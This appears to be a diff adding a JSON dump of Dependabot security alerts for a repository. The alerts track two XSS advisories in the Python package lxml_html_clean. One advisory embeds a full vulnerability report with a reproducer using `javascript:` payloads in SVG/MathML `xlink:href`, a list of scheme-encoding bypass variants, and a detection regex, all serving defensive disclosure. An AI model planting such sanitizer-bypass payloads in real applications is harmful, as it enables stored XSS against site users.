@@ -1,0 +1,2129 @@
+[
+    {
+        "number": 621,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "manifest_path": "backend/requirements/dev.txt",
+            "scope": "development",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-5jfw-gq64-q45f",
+            "cve_id": "CVE-2024-52595",
+            "summary": "HTML Cleaner allows crafted scripts in special contexts like svg or math to pass through",
+            "description": "### Impact\n\nThe HTML Parser in lxml does not properly handle context-switching for special HTML tags such as `<svg>`, `<math>` and `<noscript>`. This behavior deviates from how web browsers parse and interpret such tags. Specifically, content in CSS comments is ignored by lxml_html_clean but may be interpreted differently by web browsers, enabling malicious scripts to bypass the cleaning process. This vulnerability could lead to Cross-Site Scripting (XSS) attacks, compromising the security of users relying on lxml_html_clean in default configuration for sanitizing untrusted HTML content.\n\n### Patches\n\nUsers employing the HTML cleaner in a security-sensitive context should upgrade to lxml 0.4.0, which addresses this issue.\n\n### Workarounds\n\nAs a temporary mitigation, users can configure lxml_html_clean with the following settings to prevent the exploitation of this vulnerability:\n* `remove_tags`: Specify tags to remove - their content is moved to their parents' tags.\n* `kill_tags`: Specify tags to be removed completely.\n* `allow_tags`: Restrict the set of permissible tags, excluding context-switching tags like `<svg>`, `<math>` and `<noscript>`.\n\n### References\n\n* https://github.com/fedora-python/lxml_html_clean/pull/19\n* https://github.com/fedora-python/lxml_html_clean/pull/19/commits/c5d816f86eb3707d72a8ecf5f3823e0daa1b3808\n",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-5jfw-gq64-q45f",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-52595",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-5jfw-gq64-q45f"
+                },
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/pull/19"
+                },
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/commit/c5d816f86eb3707d72a8ecf5f3823e0daa1b3808"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52595"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/lxml-html-clean/PYSEC-2024-160.yaml"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-5jfw-gq64-q45f"
+                }
+            ],
+            "published_at": "2024-11-19T21:07:59Z",
+            "updated_at": "2025-01-14T16:37:33Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "lxml-html-clean"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 0.4.0",
+                    "first_patched_version": {
+                        "identifier": "0.4.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H",
+                    "score": 7.7
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00472,
+                "percentile": 0.38514
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H",
+                "score": 7.7
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-79",
+                    "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                },
+                {
+                    "cwe_id": "CWE-83",
+                    "name": "Improper Neutralization of Script in Attributes in a Web Page"
+                },
+                {
+                    "cwe_id": "CWE-184",
+                    "name": "Incomplete List of Disallowed Inputs"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 0.4.0",
+            "first_patched_version": {
+                "identifier": "0.4.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/621",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/621",
+        "created_at": "2026-08-15T23:19:42Z",
+        "updated_at": "2026-08-16T01:17:15Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 620,
+        "state": "open",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-5jfw-gq64-q45f",
+            "cve_id": "CVE-2024-52595",
+            "summary": "HTML Cleaner allows crafted scripts in special contexts like svg or math to pass through",
+            "description": "### Impact\n\nThe HTML Parser in lxml does not properly handle context-switching for special HTML tags such as `<svg>`, `<math>` and `<noscript>`. This behavior deviates from how web browsers parse and interpret such tags. Specifically, content in CSS comments is ignored by lxml_html_clean but may be interpreted differently by web browsers, enabling malicious scripts to bypass the cleaning process. This vulnerability could lead to Cross-Site Scripting (XSS) attacks, compromising the security of users relying on lxml_html_clean in default configuration for sanitizing untrusted HTML content.\n\n### Patches\n\nUsers employing the HTML cleaner in a security-sensitive context should upgrade to lxml 0.4.0, which addresses this issue.\n\n### Workarounds\n\nAs a temporary mitigation, users can configure lxml_html_clean with the following settings to prevent the exploitation of this vulnerability:\n* `remove_tags`: Specify tags to remove - their content is moved to their parents' tags.\n* `kill_tags`: Specify tags to be removed completely.\n* `allow_tags`: Restrict the set of permissible tags, excluding context-switching tags like `<svg>`, `<math>` and `<noscript>`.\n\n### References\n\n* https://github.com/fedora-python/lxml_html_clean/pull/19\n* https://github.com/fedora-python/lxml_html_clean/pull/19/commits/c5d816f86eb3707d72a8ecf5f3823e0daa1b3808\n",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-5jfw-gq64-q45f",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2024-52595",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-5jfw-gq64-q45f"
+                },
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/pull/19"
+                },
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/commit/c5d816f86eb3707d72a8ecf5f3823e0daa1b3808"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52595"
+                },
+                {
+                    "url": "https://github.com/pypa/advisory-database/tree/main/vulns/lxml-html-clean/PYSEC-2024-160.yaml"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-5jfw-gq64-q45f"
+                }
+            ],
+            "published_at": "2024-11-19T21:07:59Z",
+            "updated_at": "2025-01-14T16:37:33Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "lxml-html-clean"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 0.4.0",
+                    "first_patched_version": {
+                        "identifier": "0.4.0"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H",
+                    "score": 7.7
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "epss": {
+                "percentage": 0.00472,
+                "percentile": 0.38514
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H",
+                "score": 7.7
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-79",
+                    "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                },
+                {
+                    "cwe_id": "CWE-83",
+                    "name": "Improper Neutralization of Script in Attributes in a Web Page"
+                },
+                {
+                    "cwe_id": "CWE-184",
+                    "name": "Incomplete List of Disallowed Inputs"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml-html-clean"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 0.4.0",
+            "first_patched_version": {
+                "identifier": "0.4.0"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/620",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/620",
+        "created_at": "2026-08-15T23:19:37Z",
+        "updated_at": "2026-08-16T01:17:09Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": null,
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 276,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml_html_clean"
+            },
+            "manifest_path": "backend/requirements/dev.txt",
+            "scope": "development",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-4jhm-jv67-739f",
+            "cve_id": "CVE-2026-49825",
+            "summary": "`lxml_html_clean.Cleaner` does not strip `javascript:` URLs from namespaced URL attributes",
+            "description": "# `lxml_html_clean.Cleaner` does not strip `javascript:` URLs from namespaced URL attributes (`xlink:href`)\n\n**Reporter:** Guillem Lefait <guillem@datamq.com> · **Date:** 2026-05-10\n**Affected:** `lxml` ≤ 6.1.0 and `lxml_html_clean` ≤ 0.4.4 (latest stable)\n**Confirmed against:** lxml 6.1.0 + lxml_html_clean 0.4.4 on Python 3.13.5, 3.14.4, and 3.15.0a8 (libxml2 2.14.6 / 2.9.14 — bug is in pure-Python sanitizer logic, independent of the libxml2 backend)\n**Root-cause class:** same as CVE-2021-28957 (`formaction` missing from `link_attrs`)\n\n## Summary\n\n`Cleaner` filters URL schemes (`javascript:`, `vbscript:`, …) by walking links via `rewrite_links()`, which delegates to `iterlinks()`, which only yields attributes named in `lxml.html.defs.link_attrs`. That allow-list contains no prefixed names (`xlink:href`) and no `srcset`. As a result, when `Cleaner` is configured with `safe_attrs_only=False` — a documented option for callers that want lenient attribute handling but still expect URL-scheme scrubbing — `<a xlink:href=\"javascript:…\">` survives sanitization untouched, and any browser that follows the SVG-anchor specification will execute the JavaScript when the rendered link is clicked.\n\n**CWE:** CWE-79 (XSS), with CWE-184 (Incomplete List of Disallowed Inputs) as the underlying defect class.\n\n## Affected components\n\n| Package            | Versions tested        | File / line                      |\n|--------------------|------------------------|----------------------------------|\n| `lxml`             | 4.9.x, 5.2.1, 6.1.0    | `src/lxml/html/defs.py:20`       |\n| `lxml`             | \"                      | `src/lxml/html/__init__.py:485-528` |\n| `lxml_html_clean`  | 0.4.0 – 0.4.4          | `lxml_html_clean/clean.py:348,576` |\n\nThe legacy `lxml.html.clean` module — bundled in `lxml < 5.2.0` and still installable on newer versions via the `lxml[html_clean]` extra — shares the same bug.\n\n## Root cause\n\n`defs.link_attrs` is a flat string set; the literal `xlink:href` is absent:\n\n```python\n# lxml/html/defs.py\nlink_attrs = frozenset([\n    'action', 'archive', 'background', 'cite', 'classid',\n    'codebase', 'data', 'href', 'longdesc', 'profile', 'src',\n    'usemap', 'dynsrc', 'lowsrc', 'formaction',\n])\n```\n\n`HtmlMixin.iterlinks()` (`lxml/html/__init__.py:526-528`) only yields attributes whose key is in that set:\n\n```python\nfor attrib in link_attrs:\n    if attrib in attribs:\n        yield (el, attrib, attribs[attrib], 0)\n```\n\n`Cleaner.__call__` registers the URL-scheme filter via `rewrite_links` (`lxml_html_clean/clean.py:348`), which is a thin wrapper around `iterlinks()`. Because `xlink:href` is never yielded, `_remove_javascript_link` (`clean.py:576`) is never invoked for it.\n\n## Minimal reproducer\n\n```python\nfrom lxml import html\nfrom lxml_html_clean import Cleaner\n\nfor payload in (\n    '<svg><a xlink:href=\"javascript:alert(1)\">x</a></svg>',\n    '<math><a xlink:href=\"javascript:alert(2)\">y</a></math>',\n):\n    tree = html.fromstring(payload)\n    Cleaner(safe_attrs_only=False)(tree)\n    print(html.tostring(tree).decode())\n    print('  iterlinks:', list(html.fromstring(payload).iterlinks()))\n# <svg><a xlink:href=\"javascript:alert(1)\">x</a></svg>     ← unchanged\n#   iterlinks: []                                          ← link rewriter blind\n# <math><a xlink:href=\"javascript:alert(2)\">y</a></math>   ← unchanged\n#   iterlinks: []                                          ← link rewriter blind\n```\n\nBoth SVG and MathML scopes are vulnerable — same allow-list gap, both render anchors that browsers treat as navigable. Other lab-confirmed surviving variants (same scope, different scheme encoding): mixed-case (`JaVaScRiPt:`), HTML-entity (`java&#x73;cript:`), embedded tab (`java\\tscript:`).\n\n## Impact\n\nA caller that uses `Cleaner` to neutralise untrusted HTML and chooses `safe_attrs_only=False` — typically because the application wants to allow custom data-/aria-/vendor attributes — will silently pass `javascript:` payloads carried on `xlink:href` through to victim renders. Stored XSS in any application that round-trips user-supplied HTML through this configuration. Reach is conditional on the `safe_attrs_only=False` toggle, but that is a documented public option; consumers reasonably expect URL-scheme scrubbing to be independent of attribute allow-listing.\n\n## Suggested fix\n\n**Extend `link_attrs`** to include `xlink:href`. In HTML mode, `lxml.html` keeps prefixed attribute names verbatim — the parsed key is the literal string `xlink:href`, not a Clark-notation form — so the existing allow-list lookup is a plain string match. Same shape as the CVE-2021-28957 fix:\n\n```diff\n # lxml/html/defs.py\n link_attrs = frozenset([\n     'action', 'archive', 'background', 'cite', 'classid',\n     'codebase', 'data', 'href', 'longdesc', 'profile', 'src',\n     'usemap', 'dynsrc', 'lowsrc', 'formaction',\n+    'xlink:href',\n ])\n```\n\nThis single change closes the reported XSS for both SVG `<a xlink:href>` and MathML `<a xlink:href>`. `lxml_html_clean` is the canonical home of the `Cleaner` code (881 lines); `lxml.html.clean` is a 21-line backward-compat shim (`from lxml_html_clean import *`) that picks up the fix automatically once `link_attrs` is updated upstream. Since the upstream change requires lxml maintainer action, see the alternative below if a self-contained patch in `lxml_html_clean` is preferred.\n\n**Alternative (in-package fix, no lxml coordination needed):** add a namespaced-URL-attribute walk inside `Cleaner.__call__` so the URL-scheme filter doesn't depend on `link_attrs`. Sketch:\n\n```python\n# lxml_html_clean/clean.py — supplements rewrite_links() in __call__\n_NS_URL_ATTRS = ('xlink:href',)  # extend as needed\n_BAD_SCHEME = re.compile(r'^\\s*(javascript|vbscript|data):', re.I)\n\nfor el in doc.iter():\n    for attr in _NS_URL_ATTRS:\n        if attr in el.attrib and _BAD_SCHEME.match(el.attrib[attr]):\n            del el.attrib[attr]\n```\n\nThis decouples the cleaner from the upstream `link_attrs` set and matches the security-ownership boundary established when the cleaner was extracted in lxml 5.2.0.\n\n**Defense in depth (optional, regardless of which fix path is taken):**\n- Also handle `srcset`: the value is a `url 1x, url 2x, …` descriptor list, so split on commas and validate each candidate URL. Not directly executable in current browsers, but closes the same gap.\n- Also accept Clark-notation forms (`{http://www.w3.org/1999/xlink}href`) so XML-mode callers using `lxml.etree` get the same protection. HTML mode never produces this form, so not needed for the reported bug.\n\n## Severity\n\nCVSS 3.1 base score: **8.2 / High** — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` (stored XSS; victim must click the SVG anchor; scope-changed because script executes in the rendering origin). PR:N reflects the common case where untrusted HTML enters the sanitizer from anonymous sources (comments, support tickets); deployments that gate writes behind authentication can score with PR:L (→ 7.6).\n\nSeverity is **CONDITIONAL** on the caller passing `safe_attrs_only=False`. With the class default (`True`), attribute allow-listing strips `xlink:href` before scheme scrubbing runs, and the bug does not fire — verified at HEAD: default-config `Cleaner()(<svg><a xlink:href=\"javascript:…\">x</a></svg>)` → `<svg><a>x</a></svg>`.\n\n## Prior art / novelty\n\n- **CVE-2021-28957 (lxml 4.6.3)** — same root cause, different attribute (`formaction`). Fix was a one-line extension of `link_attrs`. Direct precedent.\n- **CVE-2022-34473** (Mozilla Sanitizer API) — `xlink:href` URL bypass primitive in a different sanitizer.\n- **Bleach (Mozilla, Python)** explicitly handles the `xlink` namespace; `enshrined/svg-sanitize` (PHP) ships `cleanXlinkHrefs()`; DOMPurify scrubs `xlink:href` via `ALLOWED_URI_REGEXP`.\n- **`nh3`** (the alternative recommended in `lxml_html_clean`'s own README for security-sensitive use) is **not vulnerable** to this primitive — verified 2026-05-10 on `nh3==0.3.5`: with `<svg>`/`<math>`/`<a>` and `xlink:href` explicitly added to `tags`/`attributes`, both SVG and MathML payloads, all four scheme-encoding variants, are stripped (output e.g. `<svg><a rel=\"noopener noreferrer\">x</a></svg>`).\n\n\n## Coordination\n\nFiling as a private GHSA at `fedora-python/lxml_html_clean` — `lxml_html_clean` is the canonical maintainer of the `Cleaner` code (881 lines) and the security-responsible team since the lxml 5.2.0 split, where the cleaner was extracted out of lxml precisely so cleaner-security reports could land on the right team. The lxml side cannot be filed via GHSA (`https://github.com/lxml/lxml/security/advisories/new` returns 404 — private reporting is not enabled), so a parallel report has been emailed directly to the lxml maintainer for the upstream `defs.link_attrs` patch path. You're welcome to coordinate with them directly if you'd prefer the upstream fix over the in-package alternative above.\n\nHappy to provide a draft patch or PR on either path. No bounty expected.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-4jhm-jv67-739f",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-49825",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-4jhm-jv67-739f"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-4jhm-jv67-739f"
+                }
+            ],
+            "published_at": "2026-07-08T20:23:22Z",
+            "updated_at": "2026-07-08T20:23:23Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "lxml_html_clean"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 0.4.5",
+                    "first_patched_version": {
+                        "identifier": "0.4.5"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+                    "score": 8.2
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+                "score": 8.2
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-79",
+                    "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                },
+                {
+                    "cwe_id": "CWE-184",
+                    "name": "Incomplete List of Disallowed Inputs"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml_html_clean"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 0.4.5",
+            "first_patched_version": {
+                "identifier": "0.4.5"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/danswerai/dependabot/alerts/276",
+        "html_url": "https://github.com/fcas/danswerai/security/dependabot/276",
+        "created_at": "2026-08-14T17:00:16Z",
+        "updated_at": "2026-08-16T01:17:14Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:17:14Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 275,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml_html_clean"
+            },
+            "manifest_path": "backend/requirements/default.txt",
+            "scope": "runtime",
+            "relationship": "unknown"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-4jhm-jv67-739f",
+            "cve_id": "CVE-2026-49825",
+            "summary": "`lxml_html_clean.Cleaner` does not strip `javascript:` URLs from namespaced URL attributes",
+            "description": "# `lxml_html_clean.Cleaner` does not strip `javascript:` URLs from namespaced URL attributes (`xlink:href`)\n\n**Reporter:** Guillem Lefait <guillem@datamq.com> · **Date:** 2026-05-10\n**Affected:** `lxml` ≤ 6.1.0 and `lxml_html_clean` ≤ 0.4.4 (latest stable)\n**Confirmed against:** lxml 6.1.0 + lxml_html_clean 0.4.4 on Python 3.13.5, 3.14.4, and 3.15.0a8 (libxml2 2.14.6 / 2.9.14 — bug is in pure-Python sanitizer logic, independent of the libxml2 backend)\n**Root-cause class:** same as CVE-2021-28957 (`formaction` missing from `link_attrs`)\n\n## Summary\n\n`Cleaner` filters URL schemes (`javascript:`, `vbscript:`, …) by walking links via `rewrite_links()`, which delegates to `iterlinks()`, which only yields attributes named in `lxml.html.defs.link_attrs`. That allow-list contains no prefixed names (`xlink:href`) and no `srcset`. As a result, when `Cleaner` is configured with `safe_attrs_only=False` — a documented option for callers that want lenient attribute handling but still expect URL-scheme scrubbing — `<a xlink:href=\"javascript:…\">` survives sanitization untouched, and any browser that follows the SVG-anchor specification will execute the JavaScript when the rendered link is clicked.\n\n**CWE:** CWE-79 (XSS), with CWE-184 (Incomplete List of Disallowed Inputs) as the underlying defect class.\n\n## Affected components\n\n| Package            | Versions tested        | File / line                      |\n|--------------------|------------------------|----------------------------------|\n| `lxml`             | 4.9.x, 5.2.1, 6.1.0    | `src/lxml/html/defs.py:20`       |\n| `lxml`             | \"                      | `src/lxml/html/__init__.py:485-528` |\n| `lxml_html_clean`  | 0.4.0 – 0.4.4          | `lxml_html_clean/clean.py:348,576` |\n\nThe legacy `lxml.html.clean` module — bundled in `lxml < 5.2.0` and still installable on newer versions via the `lxml[html_clean]` extra — shares the same bug.\n\n## Root cause\n\n`defs.link_attrs` is a flat string set; the literal `xlink:href` is absent:\n\n```python\n# lxml/html/defs.py\nlink_attrs = frozenset([\n    'action', 'archive', 'background', 'cite', 'classid',\n    'codebase', 'data', 'href', 'longdesc', 'profile', 'src',\n    'usemap', 'dynsrc', 'lowsrc', 'formaction',\n])\n```\n\n`HtmlMixin.iterlinks()` (`lxml/html/__init__.py:526-528`) only yields attributes whose key is in that set:\n\n```python\nfor attrib in link_attrs:\n    if attrib in attribs:\n        yield (el, attrib, attribs[attrib], 0)\n```\n\n`Cleaner.__call__` registers the URL-scheme filter via `rewrite_links` (`lxml_html_clean/clean.py:348`), which is a thin wrapper around `iterlinks()`. Because `xlink:href` is never yielded, `_remove_javascript_link` (`clean.py:576`) is never invoked for it.\n\n## Minimal reproducer\n\n```python\nfrom lxml import html\nfrom lxml_html_clean import Cleaner\n\nfor payload in (\n    '<svg><a xlink:href=\"javascript:alert(1)\">x</a></svg>',\n    '<math><a xlink:href=\"javascript:alert(2)\">y</a></math>',\n):\n    tree = html.fromstring(payload)\n    Cleaner(safe_attrs_only=False)(tree)\n    print(html.tostring(tree).decode())\n    print('  iterlinks:', list(html.fromstring(payload).iterlinks()))\n# <svg><a xlink:href=\"javascript:alert(1)\">x</a></svg>     ← unchanged\n#   iterlinks: []                                          ← link rewriter blind\n# <math><a xlink:href=\"javascript:alert(2)\">y</a></math>   ← unchanged\n#   iterlinks: []                                          ← link rewriter blind\n```\n\nBoth SVG and MathML scopes are vulnerable — same allow-list gap, both render anchors that browsers treat as navigable. Other lab-confirmed surviving variants (same scope, different scheme encoding): mixed-case (`JaVaScRiPt:`), HTML-entity (`java&#x73;cript:`), embedded tab (`java\\tscript:`).\n\n## Impact\n\nA caller that uses `Cleaner` to neutralise untrusted HTML and chooses `safe_attrs_only=False` — typically because the application wants to allow custom data-/aria-/vendor attributes — will silently pass `javascript:` payloads carried on `xlink:href` through to victim renders. Stored XSS in any application that round-trips user-supplied HTML through this configuration. Reach is conditional on the `safe_attrs_only=False` toggle, but that is a documented public option; consumers reasonably expect URL-scheme scrubbing to be independent of attribute allow-listing.\n\n## Suggested fix\n\n**Extend `link_attrs`** to include `xlink:href`. In HTML mode, `lxml.html` keeps prefixed attribute names verbatim — the parsed key is the literal string `xlink:href`, not a Clark-notation form — so the existing allow-list lookup is a plain string match. Same shape as the CVE-2021-28957 fix:\n\n```diff\n # lxml/html/defs.py\n link_attrs = frozenset([\n     'action', 'archive', 'background', 'cite', 'classid',\n     'codebase', 'data', 'href', 'longdesc', 'profile', 'src',\n     'usemap', 'dynsrc', 'lowsrc', 'formaction',\n+    'xlink:href',\n ])\n```\n\nThis single change closes the reported XSS for both SVG `<a xlink:href>` and MathML `<a xlink:href>`. `lxml_html_clean` is the canonical home of the `Cleaner` code (881 lines); `lxml.html.clean` is a 21-line backward-compat shim (`from lxml_html_clean import *`) that picks up the fix automatically once `link_attrs` is updated upstream. Since the upstream change requires lxml maintainer action, see the alternative below if a self-contained patch in `lxml_html_clean` is preferred.\n\n**Alternative (in-package fix, no lxml coordination needed):** add a namespaced-URL-attribute walk inside `Cleaner.__call__` so the URL-scheme filter doesn't depend on `link_attrs`. Sketch:\n\n```python\n# lxml_html_clean/clean.py — supplements rewrite_links() in __call__\n_NS_URL_ATTRS = ('xlink:href',)  # extend as needed\n_BAD_SCHEME = re.compile(r'^\\s*(javascript|vbscript|data):', re.I)\n\nfor el in doc.iter():\n    for attr in _NS_URL_ATTRS:\n        if attr in el.attrib and _BAD_SCHEME.match(el.attrib[attr]):\n            del el.attrib[attr]\n```\n\nThis decouples the cleaner from the upstream `link_attrs` set and matches the security-ownership boundary established when the cleaner was extracted in lxml 5.2.0.\n\n**Defense in depth (optional, regardless of which fix path is taken):**\n- Also handle `srcset`: the value is a `url 1x, url 2x, …` descriptor list, so split on commas and validate each candidate URL. Not directly executable in current browsers, but closes the same gap.\n- Also accept Clark-notation forms (`{http://www.w3.org/1999/xlink}href`) so XML-mode callers using `lxml.etree` get the same protection. HTML mode never produces this form, so not needed for the reported bug.\n\n## Severity\n\nCVSS 3.1 base score: **8.2 / High** — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` (stored XSS; victim must click the SVG anchor; scope-changed because script executes in the rendering origin). PR:N reflects the common case where untrusted HTML enters the sanitizer from anonymous sources (comments, support tickets); deployments that gate writes behind authentication can score with PR:L (→ 7.6).\n\nSeverity is **CONDITIONAL** on the caller passing `safe_attrs_only=False`. With the class default (`True`), attribute allow-listing strips `xlink:href` before scheme scrubbing runs, and the bug does not fire — verified at HEAD: default-config `Cleaner()(<svg><a xlink:href=\"javascript:…\">x</a></svg>)` → `<svg><a>x</a></svg>`.\n\n## Prior art / novelty\n\n- **CVE-2021-28957 (lxml 4.6.3)** — same root cause, different attribute (`formaction`). Fix was a one-line extension of `link_attrs`. Direct precedent.\n- **CVE-2022-34473** (Mozilla Sanitizer API) — `xlink:href` URL bypass primitive in a different sanitizer.\n- **Bleach (Mozilla, Python)** explicitly handles the `xlink` namespace; `enshrined/svg-sanitize` (PHP) ships `cleanXlinkHrefs()`; DOMPurify scrubs `xlink:href` via `ALLOWED_URI_REGEXP`.\n- **`nh3`** (the alternative recommended in `lxml_html_clean`'s own README for security-sensitive use) is **not vulnerable** to this primitive — verified 2026-05-10 on `nh3==0.3.5`: with `<svg>`/`<math>`/`<a>` and `xlink:href` explicitly added to `tags`/`attributes`, both SVG and MathML payloads, all four scheme-encoding variants, are stripped (output e.g. `<svg><a rel=\"noopener noreferrer\">x</a></svg>`).\n\n\n## Coordination\n\nFiling as a private GHSA at `fedora-python/lxml_html_clean` — `lxml_html_clean` is the canonical maintainer of the `Cleaner` code (881 lines) and the security-responsible team since the lxml 5.2.0 split, where the cleaner was extracted out of lxml precisely so cleaner-security reports could land on the right team. The lxml side cannot be filed via GHSA (`https://github.com/lxml/lxml/security/advisories/new` returns 404 — private reporting is not enabled), so a parallel report has been emailed directly to the lxml maintainer for the upstream `defs.link_attrs` patch path. You're welcome to coordinate with them directly if you'd prefer the upstream fix over the in-package alternative above.\n\nHappy to provide a draft patch or PR on either path. No bounty expected.",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-4jhm-jv67-739f",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2026-49825",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-4jhm-jv67-739f"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-4jhm-jv67-739f"
+                }
+            ],
+            "published_at": "2026-07-08T20:23:22Z",
+            "updated_at": "2026-07-08T20:23:23Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "lxml_html_clean"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 0.4.5",
+                    "first_patched_version": {
+                        "identifier": "0.4.5"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+                    "score": 8.2
+                },
+                "cvss_v4": {
+                    "vector_string": null,
+                    "score": 0.0
+                }
+            },
+            "cvss": {
+                "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+                "score": 8.2
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-79",
+                    "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+                },
+                {
+                    "cwe_id": "CWE-184",
+                    "name": "Incomplete List of Disallowed Inputs"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "lxml_html_clean"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 0.4.5",
+            "first_patched_version": {
+                "identifier": "0.4.5"
+            }
+        },
